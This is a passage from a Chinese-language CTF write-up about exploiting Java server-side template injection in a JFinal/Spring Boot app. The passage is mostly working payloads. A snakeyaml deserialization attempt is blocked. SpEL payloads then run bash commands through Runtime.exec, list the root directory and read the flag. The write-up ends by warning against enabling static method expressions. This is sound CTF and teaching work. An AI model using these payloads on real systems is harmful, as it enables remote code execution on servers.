+    ├── micrometer-observation-1.12.1.jar
+    ├── slf4j-api-2.0.9.jar
+    ├── snakeyaml-2.2.jar
+    ├── spring-aop-6.1.2.jar
+    ├── spring-beans-6.1.2.jar
+    ├── spring-boot-3.2.1.jar
+    ├── spring-boot-autoconfigure-3.2.1.jar
+    ├── spring-boot-jarmode-layertools-3.2.1.jar
+    ├── spring-context-6.1.2.jar
+    ├── spring-core-6.1.2.jar
+    ├── spring-expression-6.1.2.jar
+    ├── spring-jcl-6.1.2.jar
+    ├── spring-web-6.1.2.jar
+    ├── spring-webmvc-6.1.2.jar
+    ├── tomcat-embed-core-10.1.17.jar
+    ├── tomcat-embed-el-10.1.17.jar
+    └── tomcat-embed-websocket-10.1.17.jar
+
+5 directories, 35 files
+```
+
+问了 AI 发现里面可能可行的是 snakeyaml 和 SpEL。
+
+snakeyaml-2.2.jar：一个著名的 Java YAML 解析库，经常与反序列化漏洞相关
+
+spring-expression-6.1.2.jar：Spring 表达式语言 (SpEL)，一个功能强大的表达式引擎，用得不好就是 RCE
+
+```java
+#set(yaml = java.beans.Beans::instantiate(null, "org.yaml.snakeyaml.Yaml"))
+#set(processor = yaml.load('!!javax.el.ELProcessor []'))
+#(processor.eval('java.lang.Runtime.getRuntime().exec("bash -c \'ls -la / > /tmp/result.txt\'")'))
+
+// com.jfinal.template.TemplateException: Global tag is not allowed: tag:yaml.org,2002:javax.el.ELProcessor in 'string', line 1, column 1: !!javax.el.ELProcessor [] ^ String template line: 1
+```
+
+尝试用 yaml.load('!!javax.el.ELProcessor []') 来加载一个恶意的 YAML, 实例化一个可以执行代码的类。但收到 `Global tag is not allowed`，禁止了这种能实例化任意类的全局标签。所以看看 SpEL。
+
+```java
+#set(parser=java.beans.Beans::instantiate(null,"org.springframework.expression.spel.standard.SpelExpressionParser"))
+#set(expr=parser.parseExpression('T(java.lang.Runtime).getRuntime().exec("bash -c \'ls -la / > /tmp/final_result.txt\'")'))
+#(expr.getValue())
+
+// Process[pid=37, exitValue=2]
+```
+
+发现这个指令成功运行了，只是报错了。我们看看为什么报错。
+
+```java
+#set(parser=java.beans.Beans::instantiate(null,"org.springframework.expression.spel.standard.SpelExpressionParser"))
+#set(expr=parser.parseExpression('T(java.lang.Runtime).getRuntime().exec("touch /tmp/it_works")'))
+#(expr.getValue())
+
+// Process[pid=42, exitValue="not exited"]
+
+
+#(java.nio.file.Files::readAllLines(java.nio.file.Paths::get("/tmp/it_works")))
+
+[]
+
+
+#set(parser=java.beans.Beans::instantiate(null,"org.springframework.expression.spel.standard.SpelExpressionParser"))
+#set(expr=parser.parseExpression('T(java.lang.Runtime).getRuntime().exec("bash -c \'ls -la / > /tmp/final_result.txt\'")'))
+#(expr.getValue())
+
+// Process[pid=46, exitValue="not exited"]
+
+
+#(java.nio.file.Files::readAllLines(java.nio.file.Paths::get("/tmp/final_result.txt")))
+
+// com.jfinal.template.TemplateException: null String template line: 1
+```
+
+我们成功创建了一个文件，读取了它，说明这个RCE是能用的。奇怪的是上面的 payload 重新试了一次又不报错了，但是还是没有成功写入。应该是 exec() 里面单引号的问题。那我直接在里面放`String[] array`好了。
+
+```java
+#set(parser=java.beans.Beans::instantiate(null,"org.springframework.expression.spel.standard.SpelExpressionParser"))
+#set(expr=parser.parseExpression('T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","ls -la / > /tmp/final_result.txt"})'))
+#(expr.getValue())
+
+// Process[pid=51, exitValue="not exited"] 
+
+
+#(java.nio.file.Files::readAllLines(java.nio.file.Paths::get("/tmp/final_result.txt")))
+
+// [
+//     total 2088, 
+//     drwxr-xr-x 1 root root 4096 Sep 4 13:22 ., 
+//     drwxr-xr-x 1 root root 4096 Sep 4 13:22 .., 
+//     drwxr-xr-x 1 ctf root 4096 Sep 1 04:00 app, 
+//     -rw-r--r-- 1 root root 41 Sep 1 04:00 bF14g_asg7f8as9, 
+//     -rwsr-xr-x 1 root root 1234376 Sep 1 04:00 bash, 
+//     drwxr-xr-x 2 root root 4096 Apr 18 2022 bin, 
+//     drwxr-xr-x 2 root root 4096 Mar 19 2022 boot, 
+//     drwxr-xr-x 5 root root 360 Sep 4 13:22 dev, 
+//     drwxr-xr-x 1 root root 4096 Sep 4 13:22 etc, 
+//     -r-------- 1 root root 16 Aug 31 14:20 flag, 
+//     drwxr-xr-x 1 root root 4096 Sep 1 04:00 home, 
+//     drwxr-xr-x 8 root root 4096 Apr 18 2022 lib, 
+//     drwxr-xr-x 2 root root 4096 Apr 18 2022 lib64, 
+//     drwxr-xr-x 2 root root 4096 Apr 18 2022 media, 
+//     drwxr-xr-x 2 root root 4096 Apr 18 2022 mnt, 
+//     drwxr-xr-x 2 root root 4096 Apr 18 2022 opt, 
+//     dr-xr-xr-x 300 root root 0 Sep 4 13:22 proc, 
+//     -rwsr-xr-x 1 root root 814616 Aug 31 14:20 readflag, 
+//     drwx------ 1 root root 4096 Apr 20 2022 root, 
+//     drwxr-xr-x 1 root root 4096 Sep 4 13:22 run, 
+//     drwxr-xr-x 2 root root 4096 Apr 18 2022 sbin, 
+//     drwxr-xr-x 2 root root 4096 Apr 18 2022 srv, 
+//     dr-xr-xr-x 13 root root 0 Sep 3 13:48 sys, 
+//     drwxrwxrwt 1 root root 4096 Sep 4 14:43 tmp, 
+//     drwxr-xr-x 1 root root 4096 Apr 18 2022 usr, 
+//     drwxr-xr-x 1 root root 4096 Apr 18 2022 var
+// ] // 已经美化输出
+```
+
+flag 确实在根目录，但是我们是 ctf 用户，不是 root。所以提供了一个 readflag。
+
+```java
+#set(parser=java.beans.Beans::instantiate(null,"org.springframework.expression.spel.standard.SpelExpressionParser"))
+#set(expr=parser.parseExpression('T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","/readflag > /tmp/the_flag.txt"})'))
+#(expr.getValue())
+
+
+// Process[pid=37, exitValue="not exited"] 
+
+#(java.nio.file.Files::readAllLines(java.nio.file.Paths::get("/tmp/the_flag.txt")))
+
+// [flag{test_flag}]
+```
+
+?? 为什么是 test_flag 但问了 CA 发现题目没问题，说可以弹 shell, 以及我离答案非常非常近了让我再仔细看看。然后发现，-rw-r--r--，我能直接读 bF14g_asg7f8as9, 看到readflag我以为是需要用readflag读它才行。
+
+```java
+#(java.nio.file.Files::readAllLines(java.nio.file.Paths::get("/bF14g_asg7f8as9")))
+
+// [VIDAR{Now_U_Solved_This_Java_SSTI}] 
+```
+
+可能这个 readflag 是个题目开发的时候遗留的东西，mini 赛简化流程直接让我们读那个复杂名字的 flag 了。
+
+启示： 永远不要这样做:
+
+```java
+engine.setStaticMethodExpression(true);
+```
